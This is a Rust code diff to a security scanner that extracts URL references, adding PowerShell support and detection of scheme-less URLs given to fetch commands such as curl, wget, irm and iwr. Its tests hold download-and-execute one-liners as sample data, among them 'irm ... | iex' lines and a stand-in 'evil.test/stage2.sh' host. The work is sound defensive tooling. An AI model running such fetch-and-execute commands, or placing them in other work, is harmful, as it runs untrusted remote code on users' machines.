@@ -36,6 +36,7 @@ pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
             scan_source(found.text, "javascript", &mut found);
         }
         FileType::Python => scan_source(found.text, "python", &mut found),
+        FileType::PowerShell => scan_powershell(found.text, "powershell", &mut found),
         _ => {}
     }
     dedup(&mut found.refs);
@@ -748,6 +749,103 @@ fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
     commands(text, source, out);
     git_refs(text, source, out);
     urls(text, source, out);
+    bare_fetch_urls(text, source, &["curl", "curl.exe", "wget", "wget.exe"], out);
+}
+
+/// Scan PowerShell web-cmdlet arguments for fetchable URLs. PowerShell's
+/// `irm`/`iwr` aliases accept a host/path without a scheme in the same family
+/// of one-line downloaders as `curl` and `wget`; the general URL scanner is
+/// intentionally scheme-only, so this command-aware pass handles the bare
+/// form without turning arbitrary prose such as `example.com` into a fetch.
+fn scan_powershell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
+    let Some(text) = text else {
+        return;
+    };
+    // Keep explicit URLs tied to the whole command line so the fetch boundary
+    // can recognize `irm https://… | iex` as a staged execution edge too.
+    urls(text, source, out);
+    bare_fetch_urls(
+        text,
+        source,
+        &[
+            "irm",
+            "iwr",
+            "invoke-restmethod",
+            "invoke-webrequest",
+            "irm.exe",
+            "iwr.exe",
+        ],
+        out,
+    );
+}
+
+/// Find protocol-less host/path arguments to a known network fetch command.
+/// Explicit URLs remain owned by [`urls`], while this pass emits only the
+/// missing-scheme cases and normalizes them to HTTPS so the fetch boundary can
+/// parse and SSRF-check the resulting locator.
+fn bare_fetch_urls(text: &str, source: &str, commands: &[&str], out: &mut Found<'_>) {
+    for line in text.lines() {
+        let tokens: Vec<&str> = line.split_whitespace().collect();
+        for (index, token) in tokens.iter().enumerate() {
+            let command = token.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '('));
+            if !commands
+                .iter()
+                .any(|candidate| command.eq_ignore_ascii_case(candidate))
+            {
+                continue;
+            }
+            for argument in &tokens[index + 1..] {
+                let argument = argument
+                    .trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';'));
+                if argument.starts_with('-') {
+                    continue;
+                }
+                if !looks_like_protocolless_url(argument) {
+                    continue;
+                }
+                out.push(
+                    RefLocator::Url(format!("https://{argument}")),
+                    RefKind::UrlFetch,
+                    source,
+                    line.trim(),
+                );
+                break;
+            }
+            break;
+        }
+    }
+}
+
+/// A conservative host/path check used only after a recognized fetch command.
+fn looks_like_protocolless_url(value: &str) -> bool {
+    if value.is_empty()
+        || value.contains([':', '\\', '"', '\'', '`', '|', ';', '<', '>', '(', ')'])
+        || value.contains("//")
+    {
+        return false;
+    }
+    let (host, path) = value
+        .split_once('/')
+        .map_or((value, None), |(h, p)| (h, Some(p)));
+    if host.is_empty() || path.is_some_and(str::is_empty) || !host.contains('.') {
+        return false;
+    }
+    let labels: Vec<&str> = host.split('.').collect();
+    if labels.len() < 2
+        || labels.iter().any(|label| {
+            label.is_empty()
+                || label.starts_with('-')
+                || label.ends_with('-')
+                || !label
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
+        })
+    {
+        return false;
+    }
+    labels
+        .last()
+        .is_some_and(|tld| tld.len() >= 2 && tld.bytes().all(|byte| byte.is_ascii_alphabetic()))
 }
 
 /// Recognize package-manager install commands and emit a [`RefKind::Command`]
@@ -1392,6 +1490,43 @@ mod tests {
             .collect();
         assert!(url_refs.contains(&"https://web.stanford.edu/~pseay/pliant/et"));
         assert!(url_refs.contains(&"https://evil.test/stage2.sh"));
+    }
+
+    #[test]
+    fn bare_urls_in_fetch_commands_become_fetchable_references() {
+        let powershell = b"irm cdn.jsdelivr.net/gh/example/stage.ps1 | iex\n";
+        let refs = references_in_bytes(powershell, "stage.ps1");
+        assert!(
+            refs.iter().any(|reference| {
+                reference.kind == RefKind::UrlFetch
+                    && reference.locator
+                        == RefLocator::Url("https://cdn.jsdelivr.net/gh/example/stage.ps1".into())
+            }),
+            "PowerShell bare URL: {refs:?}"
+        );
+
+        let powershell = b"irm https://cdn.jsdelivr.net/gh/example/stage | iex\n";
+        let refs = references_in_bytes(powershell, "stage.ps1");
+        assert!(
+            refs.iter().any(|reference| {
+                reference.kind == RefKind::UrlFetch
+                    && reference.locator
+                        == RefLocator::Url("https://cdn.jsdelivr.net/gh/example/stage".into())
+                    && reference.source == "string"
+                    && reference.evidence == "irm https://cdn.jsdelivr.net/gh/example/stage | iex"
+            }),
+            "PowerShell explicit URL: {refs:?}"
+        );
+
+        let shell = b"curl jsonkeeper.com/abc123\n";
+        let refs = references_in_bytes(shell, "install.sh");
+        assert!(
+            refs.iter().any(|reference| {
+                reference.kind == RefKind::UrlFetch
+                    && reference.locator == RefLocator::Url("https://jsonkeeper.com/abc123".into())
+            }),
+            "curl bare URL: {refs:?}"
+        );
     }
 
     #[test]
